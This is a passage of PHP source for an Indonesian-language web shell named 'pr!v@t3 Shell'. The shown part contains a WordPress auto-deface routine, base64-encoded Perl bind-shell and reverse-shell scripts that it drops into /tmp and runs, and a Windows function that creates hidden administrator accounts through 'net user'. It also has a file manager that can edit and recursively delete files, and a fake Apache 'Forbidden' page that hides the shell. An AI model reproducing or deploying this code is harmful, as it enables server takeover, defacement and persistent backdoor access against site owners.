                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";    
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface V.2</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/3xp/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by pr!v@t3' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form></center>";
    }
} elseif($_GET['do'] == 'network') {
    echo "<form method='post'>
    <u>Bind Port:</u> <br>
    PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
    <input type='submit' name='sub_bp' value='>>'>
    </form>
    <form method='post'>
    <u>Back Connect:</u> <br>
    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
    PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
    <input type='submit' name='sub_bc' value='>>'>
    </form>";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if(isset($_POST['sub_bp'])) {
        $f_bp = fopen("/tmp/bp.pl", "w");
        fwrite($f_bp, base64_decode($bind_port_p));
        fclose($f_bp);
 
        $port = $_POST['port_bind'];
        $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
        unlink("/tmp/bp.pl");
    }
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    if(isset($_POST['sub_bc'])) {
        $f_bc = fopen("/tmp/bc.pl", "w");
        fwrite($f_bc, base64_decode($bind_connect_p));
        fclose($f_bc);
 
        $ipbc = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
        unlink("/tmp/bc.pl");
    }
}elseif($_GET['do'] == 'hash')
    {
$submit= $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
$base64_encode = base64_encode($pass); // Base64 Encode
}
echo '
<table align="center">
<tr><td><center><h1>Password Hash</h1></center><br><br></td></tr>
<form action="" method="post">
<tr><td><strong>Masukan kata yang ingin di encrypt : </strong> <input type="text" name="password" size="40" />&nbsp</td></tr>
<tr><td><input type="submit" name="enter" value="hash"/> <br><br></td></tr>
<tr><td><h1>Hasil Hash </h1></td></tr>
<tr><td><p>Original Password : <input type=text size=50 value='.$pass.'></p></td></tr>
<tr><td><p>MD5 : <input type=text size=50 value='.$hash.'></p></td></tr>
<tr><td><p>Base64 Encode : <input type=text size=50 value='.$base64_encode.'></p></td></tr>
<tr><td><p>MD4 : <input type=text size=50 value='.$md4.'></p></td></tr>
<tr><td><p>MD5 with Salt : <input type=text size=50 value='.$hash_md5.'></p></td></tr>
<tr><td><p>MD5 with Salt & Sha1 : <input type=text size=50 value='.$hash_md5_double.'></p></td></tr>
<tr><td><p>Sha1 : <input type=text size=50 value='.$hash1.'></p></td></tr>
<tr><td><p>Sha256 : <input type=text size=50 value='.$sha256.'></p></td></tr>
<tr><td><p>Sha1 with Salt : <input type=text size=50 value='.$hash1_sha1.'></p></td></tr>
<tr><td><p>Sha1 with Salt & MD5 : <input type=text size=50 value='.$hash1_sha1_double.'></p></td></tr>
</table>';
}elseif($_GET['do'] == 'rdp') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> Sudah Ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil Ndan</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal Ndan</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>Belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>pr!v@t3</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> Belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> Belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='pr!v@t3' required>
			<input type='text' name='pass' placeholder='password' value='pr!v@t3' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
}elseif($_GET['do'] == 'tentang'){
    echo "<center>";
    echo "<h2>pr!v@t3 Shell V1.0</h2>";
    echo "<p>Shell ini adalah hasil recode dari Shell Extreme Crew</p>";
	echo "<p>Dalam shell ini, juga ditambahkan beberapa Fungsi seperti Mass Mailer, Auto Edit User WP, Exploit Dan Lain Lain.</p>";
    echo "<p>Terima kasih buat <strong>Extreme Crew - IndoXploit - K2LL33D - Mr.P-teo</strong> yang telah dengan senang hati memperbolehkan menambah atau mengurangi isi coding nya";
	echo "<p>Let's Play With this Web Shell ^_^</p>";
    echo "<p>Big Thanks For : </p>";
	echo "<p>[! Extreme Crew - IndoXploit - K2LL33D - Mr.P-teo - N45HT - iTeens - Defacer Tersakiti Team - BackBox Team !]</p>";
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?bom&act=edit&folder=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?bom&folder=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?bom&folder=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    if(is_dir($dir)) {
        if(is_writable($dir)) {
            @rmdir($dir);
            @exe("rm -rf $dir");
            @exe("rmdir /s /q $dir");
            $act = "<script>window.location='?bom&folder=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>could not remove ".basename($dir)."</font>";
        }
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?bom&act=view&folder=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?bom&act=edit&folder=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?bom&act=rename&folder=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?bom&act=download&folder=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?bom&act=delete&folder=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=lime>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?bom&act=view&folder=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?bom&act=edit&folder=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?bom&act=rename&folder=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?bom&act=download&folder=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?bom&act=delete&folder=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?bom&folder=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?bom&act=view&folder=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?bom&act=edit&folder=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?bom&act=rename&folder=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?bom&act=download&folder=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?bom&act=delete&folder=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?bom&folder=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
} else {
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            echo "<font color=red>can't open directory. ( not readable )</font>";
        } else {
            echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr>
            <th class="th_home"><center>Name</center></th>
            <th class="th_home"><center>Type</center></th>
            <th class="th_home"><center>Size</center></th>
            <th class="th_home"><center>Last Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Action</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                $dtype = filetype("$dir/$dirx");
                $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
                if(!is_dir("$dir/$dirx")) continue;
                if($dirx === '..') {
                    $href = "<a href='?bom&folder=".dirname($dir)."'>$dirx</a>";
                } elseif($dirx === '.') {
                    $href = "<a href='?bom&folder=$dir'>$dirx</a>";
                } else {
                    $href = "<a href='?bom&folder=$dir/$dirx'>$dirx</a>";
                }
                if($dirx === '.' || $dirx === '..') {
                    $act_dir = "<a href='?bom&act=newfile&folder=$dir'>newfile</a> | <a href='?bom&act=newfolder&folder=$dir'>newfolder</a>";
                    } else {
                    $act_dir = "<a href='?bom&act=rename_dir&folder=$dir/$dirx'>rename</a> | <a href='?bom&act=delete_dir&folder=$dir/$dirx'>delete</a>";
                }
                echo "<tr>";
                echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        echo "<font color=red>can't open directory.</font>";
    }
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$dir/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$dir/$file");
            }
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?bom&act=view&folder=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?bom&act=edit&folder=$dir&file=$dir/$file'>edit</a> | <a href='?bom&act=rename&folder=$dir&file=$dir/$file'>rename</a> | <a href='?bom&act=delete&folder=$dir&file=$dir/$file'>delete</a> | <a href='?bom&act=download&folder=$dir&file=$dir/$file'>download</a></td>";
            echo "</tr>";
        }
        echo "</table>";
        if(!is_readable($dir)) {
            //
        } else {
            echo "<hr>";
        }
    echo "<center>Copyright &copy; ".date("Y")." - <a href='?bom&folder=$dir&do=tentang'>pr!v@t3</a></center>";
}
echo "</html>";
}
else
{
echo "<h1>Forbidden</h1><p>You dont't have permission to access ".$dir." on this server.</p><hr>
<address>Apache Server at ".gethostbyname($_SERVER['HTTP_HOST'])." Port 80</address></body></html>";
return false;
}
?>